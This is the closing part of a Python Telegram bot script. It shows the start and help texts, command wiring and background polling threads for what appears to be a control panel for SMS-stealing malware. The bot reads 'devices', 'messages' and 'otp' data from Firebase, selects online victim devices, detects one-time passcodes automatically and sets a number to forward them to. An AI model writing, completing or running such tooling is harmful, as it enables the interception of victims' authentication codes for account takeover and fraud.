        f"<b>🔧 Custom Path</b>\n\n"
        f"Usage: /custompath [type] [path]\n"
        f"Example: /custompath devices clients\n"
        f"Valid: devices, messages, otp, users, config",
        parse_mode='HTML'
    )

# ============================
# HELP / START
# ============================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"{BOT_NAME} <b>WELCOME</b>\n\n"
        f"<b>🌟 Universal Firebase Bot</b>\n"
        f"Supports ALL Firebase links & message formats!\n\n"
        f"<b>📋 Commands:</b>\n"
        f"/setup – Configure Firebase\n"
        f"/detect – Auto-detect structure\n"
        f"/devices – Select device (Online only)\n"
        f"/setotp – Set forwarding number\n"
        f"/custompath – Manual path config\n"
        f"/resetforward – Reset tracking\n"
        f"/help – Show this\n\n"
        f"<b>✨ Features:</b>\n"
        f"• All Firebase URL types\n"
        f"• All message formats\n"
        f"• No SIM? No problem!\n"
        f"• Auto OTP detection\n"
        f"• Auto structure detection\n"
        f"• <b>ONLINE devices only</b>",
        parse_mode='HTML'
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)

# ============================
# MAIN
# ============================
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Background threads
    threading.Thread(target=poll_otp_updates, daemon=True).start()
    threading.Thread(target=poll_incoming_messages, daemon=True).start()
    
    # Setup conversation
    setup_conv = ConversationHandler(
        entry_points=[CommandHandler("setup", setup_start)],
        states={
            URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, setup_url)],
            CHANNEL: [MessageHandler(filters.TEXT & ~filters.COMMAND, setup_channel)]
        },
        fallbacks=[CommandHandler("cancel", setup_cancel)],
    )
    app.add_handler(setup_conv)
    
    # OTP conversation
    otp_conv = ConversationHandler(
        entry_points=[CommandHandler("setotp", setotp_command)],
        states={WAITING_OTP_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, otp_number_input)]},
        fallbacks=[CommandHandler("cancel", otp_cancel)],
    )
    app.add_handler(otp_conv)
    
    # Callbacks
    app.add_handler(CallbackQueryHandler(device_callback, pattern="^dev_"))
    app.add_handler(CallbackQueryHandler(sim_callback, pattern="^sim_"))
    
    # Commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("devices", devices_command))
    app.add_handler(CommandHandler("resetforward", reset_forward))
    app.add_handler(CommandHandler("detect", detect_structure))
    app.add_handler(CommandHandler("custompath", custom_path_command))
    
    # Channel messages
    app.add_handler(MessageHandler(filters.TEXT & filters.ChatType.CHANNEL, handle_channel_message))
    
    logger.info("🤖 FINAL BOT STARTED - Online devices only!")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

async def otp_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("<b>❌ Cancelled.</b>", parse_mode='HTML')
    return ConversationHandler.END

if __name__ == "__main__":
    main()